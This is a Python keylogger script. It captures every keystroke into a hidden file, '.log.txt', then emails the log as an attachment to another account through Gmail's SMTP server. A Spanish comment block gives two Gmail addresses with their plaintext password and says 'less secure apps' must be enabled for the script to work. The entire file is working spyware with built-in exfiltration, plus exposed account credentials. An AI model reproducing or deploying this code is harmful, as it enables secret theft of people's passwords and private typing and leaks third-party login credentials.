from pynput import keyboard

f = open(".log.txt","a+")

"""
===========================
MAILS para hacer pruebas
===========================
teamcyber541@gmail.com
password: thepantiesbreakers

teamcyber5412@gmail.com
password: thepantiesbreakers
===========================

Necesitamos habilitar el acceso de aplicaciones poco seguras en nuestra cuenta de gmail para que funcione
"""
def send_mail(sender, sender_password, reciever):
    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders

    server = 'smtp.gmail.com'
    port = 587

    msg = MIMEMultipart("alternative")
    msg["Subject"] = 'This is a TEST'
    msg["From"] = sender
    msg["To"] = reciever
    
    msg.attach(MIMEText('Download the file', 'plain'))
    attach_file_name = '.log.txt'
    attach_file = open(attach_file_name, 'rb')
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload) #encode the attachment

    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    msg.attach(payload)

    s = smtplib.SMTP(server, port)
    s.ehlo()
    s.starttls()
    s.login(sender, sender_password)
    s.sendmail(sender, reciever, msg.as_string())
    s.quit()

def on_press(key):
    if key == keyboard.Key.esc:
        return False  # stop listener
    try:
        k = key.char  # single-char keys
        f.write(k)
    except:
        k = key.name  # other keys
        if(k=="space"):
            f.write(" ")
        elif(k=="enter"):
            f.write("\n")

    print('Key pressed: ' + k)

listener = keyboard.Listener(on_press=on_press)

listener.start()  # start to listen on a separate thread
listener.join()  # remove if main thread is polling self.keys

f.close()

# send mail
send_mail('teamcyber541@gmail.com', 'thepantiesbreakers', 'teamcyber5412@gmail.com')
print('Mail Sent')
